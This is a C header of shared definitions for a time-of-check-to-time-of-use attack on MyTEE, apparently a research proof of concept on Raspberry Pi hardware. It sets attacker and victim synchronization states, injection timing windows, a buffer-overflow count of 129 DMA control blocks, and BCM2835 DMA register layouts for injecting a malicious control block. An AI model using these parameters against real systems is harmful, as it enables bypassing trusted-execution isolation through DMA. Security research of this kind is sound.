/*
 * MyTEE TOCTOU Attack - Common Definitions
 * 
 * Shared definitions between attacker and victim modules
 */

#ifndef _TOCTOU_COMMON_H
#define _TOCTOU_COMMON_H

/* Secure Buffer Configuration (from hyp-stub.S) */
#define SECURE_BUFFER_BASE_PHYS     0x0F1FB000
#define SECURE_BUFFER_SIZE_PER_CORE 0x1000      /* 4KB per core */
#define NUM_CORES                   4

/* Control Block size */
#define CB_SIZE                     0x20        /* 32 bytes */
#define MAX_CBS_PER_CORE            (SECURE_BUFFER_SIZE_PER_CORE / CB_SIZE)  /* 128 */

/* To trigger overflow, we need > 128 CBs */
#define OVERFLOW_CB_COUNT           129

/* Synchronization shared memory */
#define SYNC_FLAG_PHYS              0x0F200000
#define SYNC_FLAG_SIZE              PAGE_SIZE

/* Sync flag values */
#define SYNC_STATE_IDLE             0x00000000
#define SYNC_STATE_VICTIM_READY     0x00000001  /* Victim is about to request DMA */
#define SYNC_STATE_VICTIM_TRAPPED   0x00000002  /* Victim trapped in EL2, copying CBs */
#define SYNC_STATE_ATTACKER_INJECT  0x00000003  /* Attacker should inject malicious CB */
#define SYNC_STATE_ATTACK_DONE      0x00000004  /* Attack completed */

/* Sync flag offsets */
#define SYNC_OFFSET_STATE           0x00
#define SYNC_OFFSET_VICTIM_CB_COUNT 0x04
#define SYNC_OFFSET_ATTACK_RESULT   0x08
#define SYNC_OFFSET_INJECT_TIME     0x0C  /* Time when attacker injected */
#define SYNC_OFFSET_DEBUG_LOG       0x10

/* Attack result codes */
#define ATTACK_RESULT_NONE          0x00000000
#define ATTACK_RESULT_INJECTED      0x00000001  /* Attacker injected CB */
#define ATTACK_RESULT_EXECUTED      0x00000002  /* DMA executed malicious CB */
#define ATTACK_RESULT_VERIFIED      0x00000003  /* Memory pattern confirmed */

/* Default timing values (microseconds) - tunable via module params */
#define DEFAULT_TIMING_READY_US     50   /* Delay after READY signal */
#define DEFAULT_TIMING_INJECT_US    100  /* Window for injection */
#define DEFAULT_TIMING_POLL_US      1    /* Polling interval */

/* DMA Control Block structure (BCM2835) */
struct bcm2835_dma_cb {
    uint32_t info;      /* Transfer info */
    uint32_t src;       /* Source address (bus) */
    uint32_t dst;       /* Destination address (bus) */
    uint32_t length;    /* Transfer length */
    uint32_t stride;    /* 2D stride */
    uint32_t next;      /* Next CB address (bus) */
    uint32_t pad[2];    /* Padding to 32 bytes */
};

/* Attack patterns - easily identifiable in memory dumps */
#define ATTACK_MAGIC_INFO           0xDEADBEEF
#define ATTACK_MAGIC_SRC            0x41414141  /* "AAAA" */
#define ATTACK_MAGIC_DST            0x42424242  /* "BBBB" */
#define ATTACK_MAGIC_LENGTH         0x1000

/* BCM2835 bus address conversions */
#define BCM2837_BUS_OFFSET          0x40000000
#define PHYS_TO_BUS(x)              ((x) + BCM2837_BUS_OFFSET)
#define BUS_TO_PHYS(x)              ((x) - BCM2837_BUS_OFFSET)

/*
 * BCM2835/BCM2837 DMA Controller Registers
 * Base: 0x3F007000 (BCM2837 peripheral base + 0x7000)
 */
#define BCM2837_PERI_BASE           0x3F000000
#define BCM2835_DMA_BASE            (BCM2837_PERI_BASE + 0x7000)
#define BCM2835_DMA_CHAN_SIZE       0x100       /* Each channel is 0x100 bytes apart */

/* DMA Channel Register Offsets */
#define BCM2835_DMA_CS              0x00        /* Control and Status */
#define BCM2835_DMA_CONBLK_AD       0x04        /* Control Block Address */
#define BCM2835_DMA_TI              0x08        /* Transfer Information (read-only) */
#define BCM2835_DMA_SOURCE_AD       0x0C        /* Source Address (read-only) */
#define BCM2835_DMA_DEST_AD         0x10        /* Destination Address (read-only) */
#define BCM2835_DMA_TXFR_LEN        0x14        /* Transfer Length (read-only) */
#define BCM2835_DMA_STRIDE          0x18        /* 2D Stride (read-only) */
#define BCM2835_DMA_NEXTCONBK       0x1C        /* Next CB Address (read-only) */
#define BCM2835_DMA_DEBUG           0x20        /* Debug */

/* DMA CS Register Bits */
#define BCM2835_DMA_ACTIVE          (1 << 0)    /* Activate the DMA */
#define BCM2835_DMA_END             (1 << 1)    /* DMA End flag */
#define BCM2835_DMA_INT             (1 << 2)    /* Interrupt status */
#define BCM2835_DMA_DREQ            (1 << 3)    /* DREQ state */
#define BCM2835_DMA_PAUSED          (1 << 4)    /* DMA Paused state */
#define BCM2835_DMA_DREQ_STOPS_DMA  (1 << 5)    /* DMA Paused by DREQ */
#define BCM2835_DMA_WAITING_FOR_WRITES (1 << 6) /* Waiting for writes */
#define BCM2835_DMA_ERR             (1 << 8)    /* DMA Error */
#define BCM2835_DMA_PRIORITY(x)     (((x) & 0xF) << 16) /* AXI Priority */
#define BCM2835_DMA_PANIC_PRIORITY(x) (((x) & 0xF) << 20) /* Panic Priority */
#define BCM2835_DMA_WAIT_FOR_WRITES (1 << 28)   /* Wait for outstanding writes */
#define BCM2835_DMA_DIS_DEBUG       (1 << 29)   /* Disable debug pause */
#define BCM2835_DMA_ABORT           (1 << 30)   /* Abort DMA */
#define BCM2835_DMA_RESET           (1 << 31)   /* Reset DMA */

/* DMA TI (Transfer Information) Register Bits */
#define BCM2835_DMA_TI_INTEN        (1 << 0)    /* Interrupt Enable */
#define BCM2835_DMA_TI_TDMODE       (1 << 1)    /* 2D Mode */
#define BCM2835_DMA_TI_WAIT_RESP    (1 << 3)    /* Wait for Write Response */
#define BCM2835_DMA_TI_D_INC        (1 << 4)    /* Destination Address Increment */
#define BCM2835_DMA_TI_D_WIDTH      (1 << 5)    /* Destination Transfer Width */
#define BCM2835_DMA_TI_D_DREQ       (1 << 6)    /* Control Dest Writes with DREQ */
#define BCM2835_DMA_TI_D_IGNORE     (1 << 7)    /* Ignore Destination Writes */
#define BCM2835_DMA_TI_S_INC        (1 << 8)    /* Source Address Increment */
#define BCM2835_DMA_TI_S_WIDTH      (1 << 9)    /* Source Transfer Width */
#define BCM2835_DMA_TI_S_DREQ       (1 << 10)   /* Control Source Reads with DREQ */
#define BCM2835_DMA_TI_S_IGNORE     (1 << 11)   /* Ignore Source Reads */

/* Use DMA channel 5 for attack (usually free, not used by GPU) */
#define ATTACK_DMA_CHANNEL          5

/* Verification buffer for attack result */
#define VERIFY_PATTERN              0xCAFEBABE
#define VERIFY_BUFFER_SIZE          0x1000

#endif /* _TOCTOU_COMMON_H */
